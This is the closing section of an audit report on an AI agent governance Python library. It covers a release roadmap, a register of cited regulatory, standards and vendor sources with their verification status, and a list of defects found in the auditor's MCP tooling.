| **P2: Release** | Q1 2027 | PyPI 0.2.0 via Trusted Publishing; Sigstore/PEP 740 attestations; SBOM; SECURITY advisories for P1/P2 | Installable `pip install autonomous-governance-laws` |
| **P3: Market fit** | Q1–Q2 2027 | OWASP ASI mapping doc; EU AI Act Art. 12/14 evidence-pack exporter; MCP 2026-07-28 middleware adapter; adapters for LangGraph / OpenAI Agents SDK / Microsoft Agent Framework; optional OPA/Cedar policy backend | Two external design partners |
| **P4: Assurance** | H2 2027 | Algorithm agility + hybrid Ed25519/ML-DSA (FIPS 204); M-of-N operator quorum; PKCS#11/HSM; external ledger anchoring | Independent third-party security review |

---

## APPENDIX A: CITATION REGISTER

Verification methods:
- **MCP**: project-local `web-search` server (`fetch_webpage` / `bulk_url_fetch`) returned HTTP 200 with an on-topic title and the claim terms present.
- **WF**: auditor `web_fetch` fallback.
- **2°**: corroborated by secondary sources only.
- **403**: the publisher blocks automated retrieval.

| Ref | Source | URL | Status |
|---|---|---|---|
| R1 | European Commission: AI Act implementation timeline | https://ai-act-service-desk.ec.europa.eu/en/ai-act/timeline/timeline-implementation-eu-ai-act | MCP ✅ |
| R2 | European Commission: "AI Omnibus enters into force" (27 Jul 2026) | https://digital-strategy.ec.europa.eu/en/news/ai-omnibus-enters-force | MCP ✅ |
| R3 | artificialintelligenceact.eu: implementation timeline; Art. 113 | https://artificialintelligenceact.eu/implementation-timeline/ | MCP ✅ |
| R4 | EU AI Act Art. 12, 14, 15, 62, 73 (artificialintelligenceact.eu); Regulation (EU) 2024/1689 (EUR-Lex) | https://artificialintelligenceact.eu/article/73/ · https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32024R1689 | MCP ✅ |
| R5 | NIST AI Risk Management Framework | https://www.nist.gov/itl/ai-risk-management-framework | MCP ✅ |
| R6 | NIST AI 600-1 Generative AI Profile | https://www.nist.gov/publications/artificial-intelligence-risk-management-framework-generative-artificial-intelligence | MCP ✅ |
| R7 | NIST: AI Agent Standards Initiative (17 Feb 2026) | https://www.nist.gov/news-events/news/2026/02/announcing-ai-agent-standards-initiative-interoperable-and-secure | MCP ✅ |
| R8 | OWASP Top 10 for Agentic Applications 2026 | https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/ | MCP ✅ + WF |
| R9 | OWASP Agentic AI: Threats and Mitigations | https://genai.owasp.org/resource/agentic-ai-threats-and-mitigations/ | MCP ✅ |
| R10 | ISO/IEC 42001:2023 | https://www.iso.org/standard/42001 | 403 |
| R11 | Hunton: Colorado AI Act amended | https://www.hunton.com/privacy-and-cybersecurity-law-blog/colorado-ai-act-amended-and-effective-date-delayed | MCP ✅ (2°) |
| R12 | Office of the Governor: SB 53 signed | https://www.gov.ca.gov/2025/09/29/governor-newsom-signs-sb-53-advancing-californias-world-leading-artificial-intelligence-industry/ | MCP ✅ |
| R13 | IMDA: Model AI Governance Framework for Agentic AI | https://www.imda.gov.sg/resources/press-releases-factsheets-and-speeches/factsheets/2026/updated-model-ai-governance-framework-for-agentic-ai | MCP ✅ |
| R14 | MCP specification 2026-07-28 | https://modelcontextprotocol.io/specification/2026-07-28 | MCP ✅ + WF |
| R15 | MCP specification 2025-11-25 | https://modelcontextprotocol.io/specification/2025-11-25 | MCP ✅ |
| R16 | NIST FIPS 204 (ML-DSA) | https://csrc.nist.gov/pubs/fips/204/final | MCP ✅ |
| R17 | NIST FIPS 186-5 | https://csrc.nist.gov/pubs/fips/186-5/final | MCP ✅ |
| R18 | RFC 8032 EdDSA | https://datatracker.ietf.org/doc/html/rfc8032 | MCP ✅ |
| R19 | RFC 6962 / RFC 9162 Certificate Transparency (Merkle tree logs) | https://datatracker.ietf.org/doc/html/rfc9162 | MCP ✅ |
| M1 | Gartner press release (17 Feb 2026) | https://www.gartner.com/en/newsroom/press-releases/2026-02-17-gartner-global-ai-regulations-fuel-billion-dollar-market-for-ai-governance-platforms | 403 · 2° ✅ |
| M2 | Grand View Research: AI Governance Market | https://www.grandviewresearch.com/industry-analysis/ai-governance-market-report | MCP ✅ (stale page title; body verified) |
| M3 | Precedence Research: AI Governance Market | https://www.precedenceresearch.com/ai-governance-market | MCP ✅ |
| M4 | MarketsandMarkets: AI Governance Market | https://www.marketsandmarkets.com/Market-Reports/ai-governance-market-176187291.html | 403 · 2° ✅ |
| C1 | NVIDIA NeMo Guardrails | https://github.com/NVIDIA/NeMo-Guardrails | MCP ✅ |
| C2 | Open Policy Agent | https://github.com/open-policy-agent/opa | MCP ✅ |
| C3 | Docker MCP Gateway | https://github.com/docker/mcp-gateway | MCP ✅ |
| C4 | Microsoft Agent Governance Toolkit | https://github.com/microsoft/agent-governance-toolkit | MCP ✅ + WF |
| C5 | Cedar policy language | https://github.com/cedar-policy/cedar | MCP ✅ |
| C6 | Guardrails AI | https://github.com/guardrails-ai/guardrails | MCP ✅ |
| C7 | Microsoft Agent 365 GA (1 May 2026) | https://www.microsoft.com/en-us/security/blog/2026/05/01/microsoft-agent-365-now-generally-available-expands-capabilities-and-integrations/ | MCP ✅ |
| C8 | AWS: Policy in Bedrock AgentCore (Cedar) | https://aws.amazon.com/blogs/security/why-policy-in-amazon-bedrock-agentcore-chose-cedar-for-securing-agentic-workflows/ | MCP ✅ |
| C9 | Google Cloud Model Armor | https://cloud.google.com/security/products/model-armor | MCP ✅ |
| C10 | Zenity $125M Series C | https://fintech.global/2026/08/04/zenity-lands-125m-as-ai-agent-security-race-heats-up/ | MCP ✅ |
| C11 | Guardrails AI joins Harvey | https://www.harvey.ai/blog/guardrails-ai-joins-harvey | MCP ✅ |
| C12 | Snyk acquires Invariant Labs | https://snyk.io/news/snyk-acquires-invariant-labs-to-accelerate-agentic-ai-security-innovation/ | MCP ✅ |
| C13 | Check Point acquires Lakera | https://www.securitysolutionsmedia.com/2025/09/19/check-point-acquires-lakera-to-deliver-end-to-end-ai-security-for-enterprises/ | MCP ✅ |
| C14 | Palo Alto completes Protect AI acquisition | https://www.paloaltonetworks.com/company/press/2025/palo-alto-networks-completes-acquisition-of-protect-ai | MCP ✅ |
| C15 | F5 to acquire CalypsoAI | https://www.f5.com/company/news/press-releases/f5-to-acquire-calypsoai-to-bring-advanced-ai-guardrails-to-large-enterprises | MCP ✅ |
| C16 | Cisco to acquire Galileo | https://www.crn.com/news/networking/2026/cisco-to-snap-up-ai-observability-startup-galileo-technologies-to-expand-splunk-platform | MCP ✅ |
| C17 | Straiker $64M Series A | https://www.prnewswire.com/news-releases/straiker-raises-64m-series-a-to-secure-the-agentic-workforce-302812638.html | MCP ✅ |

**Excluded as unverified:**
- Cisco→Astrix (single secondary source).
- Gartner Magic Quadrant placements quoted on vendor blogs.
- The "OWASP Top 17" title.
- The macro figures "$3.6B agentic-security funding" and "$105.9B agentic AI funding".

## APPENDIX B: CATALOGUE

- 40 git-tracked files at `1a0f616`. A per-file SHA-256 manifest was generated during the audit and is held in the auditor's session store (not committed, to avoid a second source of truth beside [`config/charter_manifest.json`](config/charter_manifest.json)).
- IDS knowledge-graph lineage confirmed the call paths `intercept_and_execute → evaluate_risk / _verify_approval_token → security.verify_approval_token → _log_event`. This is the path on which P1, P2, P4, P5, P6, P16, and P17 sit.

## APPENDIX C: MCP FLEET MEMORY & DEFECTS

**Memory written (goliath swarm memory, `.mcp/goliath_swarm_memory.json`):**
- **Long-term findings** (key → SHA-256 DNA of the stored value):
  - `agl_audit_2026_11_01_findings`
  - `agl_market_position_2026_11`
  - `agl_citation_register_2026_11`
  - `agl_catalogue_2026_11` (`sha256:a379833d…`)
- **Short-term active context:** `agl-audit-2026-11`, `p1-token-bypass`, `ledger-chain-reset`, `classifier-evasion`, `eu-omnibus-2027`, `market-2026-11`.
- **State after write:** 6 findings, 6 DNA entries, 9 context tags.

**Fleet defects observed (the `.mcp/` fleet is outside this repository's git history):**
1. **Fixed during audit:** `goliath/server.py` passed the fleet directory to `SwarmMemory`, which appends `.mcp/` itself. The result was a nested `.mcp/.mcp/goliath_swarm_memory.json`, so memory never reached the canonical file. It now passes the project root.
2. `web-search` → `web_search` returns "no results" for every query, so only URL fetch tools are usable.
3. `ipa` → `ipa_multi_engine_search` returns the same placeholder result for every query.
4. `ids` skips any dot-prefixed path and indexes the process CWD, so the repository cannot be catalogued in place because of `.mcp/` and `.git/`. A staged snapshot was required. TF-IDF semantic search misses exact terms (e.g. "Dilithium").
5. Fleet configuration files reference `D:\Projects\.mcp` rather than the project-local copy.
6. `fetch_webpage` is rate-limited to 10 requests per 60 s per server process; `bulk_url_fetch` caps page content at 2,000 characters.

---
*Prepared 2026-11-01 for Kirk LaSalle. Findings are reproducible from the commands in §2. No code or pinned charter files were modified by this audit.*
